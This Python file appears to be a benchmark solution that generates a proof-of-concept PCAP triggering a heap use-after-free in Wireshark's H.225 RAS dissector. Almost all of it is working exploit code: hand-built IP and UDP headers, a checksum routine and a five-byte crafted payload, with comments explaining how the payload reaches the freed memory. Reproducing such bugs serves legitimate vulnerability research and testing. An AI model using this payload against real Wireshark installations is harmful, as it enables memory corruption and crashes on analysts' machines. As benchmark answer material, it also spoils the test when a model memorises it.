import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for the H.225 Heap Use After Free vulnerability (arvo:5921).
        Target: Wireshark/TShark H.225 Dissector (UDP 1719).
        The PoC is a single-packet PCAP file of length 73 bytes.
        """
        
        # PCAP Global Header
        # Magic: 0xa1b2c3d4 (Little Endian)
        # Major: 2, Minor: 4
        # Zone: 0, SigFigs: 0
        # SnapLen: 65535
        # Network: 12 (DLT_RAW - Raw IP)
        global_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 12)

        # Payload Construction
        # To match the ground-truth length of 73 bytes:
        # 73 bytes (Total) - 24 (Global) - 16 (Packet Header) - 20 (IP) - 8 (UDP) = 5 bytes of payload.
        #
        # Vulnerability Logic:
        # The UAF occurs when dissect_h225_h225_RasMessage doesn't re-initialize next_tvb_list
        # properly when processing a packet after an exception or in a loop.
        # We need to trigger next_tvb_add_handle (allocation) and then cause a parsing error/bailout.
        #
        # Payload Bytes:
        # \x00: Selects RasMessage Choice 0 (GatekeeperRequest).
        # \xff: Sets the extension/optional bitmap to all 1s. This claims 'nonStandardData' 
        #       is present, which triggers the vulnerable 'next_tvb_add_handle' call.
        # \xff...: Subsequent bytes are garbage/truncated, causing a ReportedBoundsError exception.
        payload = b'\x00\xff\xff\xff\xff'

        # UDP Header (8 bytes)
        # Src Port: 1234
        # Dst Port: 1719 (H.225 RAS)
        # Length: 8 + 5 = 13
        # Checksum: 0
        udp_len = 8 + len(payload)
        udp_header = struct.pack('!HHHH', 1234, 1719, udp_len, 0)

        # IP Header (20 bytes)
        # Ver/IHL: 0x45 (IPv4, Header Len 5)
        # TOS: 0
        # Total Len: 20 + 13 = 33
        # ID: 1
        # Flags/Offset: 0
        # TTL: 64
        # Proto: 17 (UDP)
        # Src/Dst: 127.0.0.1
        ip_len = 20 + udp_len
        ip_src = 0x7f000001
        ip_dst = 0x7f000001
        
        # Calculate IP Checksum
        # Pack with checksum=0 first
        ip_header_tmp = struct.pack('!BBHHHBBHII', 0x45, 0, ip_len, 1, 0, 64, 17, 0, ip_src, ip_dst)
        
        s = 0
        for i in range(0, len(ip_header_tmp), 2):
            w = (ip_header_tmp[i] << 8) + ip_header_tmp[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        ip_csum = ~s & 0xffff
        
        ip_header = struct.pack('!BBHHHBBHII', 0x45, 0, ip_len, 1, 0, 64, 17, ip_csum, ip_src, ip_dst)

        # Combine Packet Data
        packet_data = ip_header + udp_header + payload

        # PCAP Packet Header (16 bytes)
        # TS Sec: 0
        # TS Usec: 0
        # Incl Len: 33
        # Orig Len: 33
        packet_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))

        return global_header + packet_header + packet_data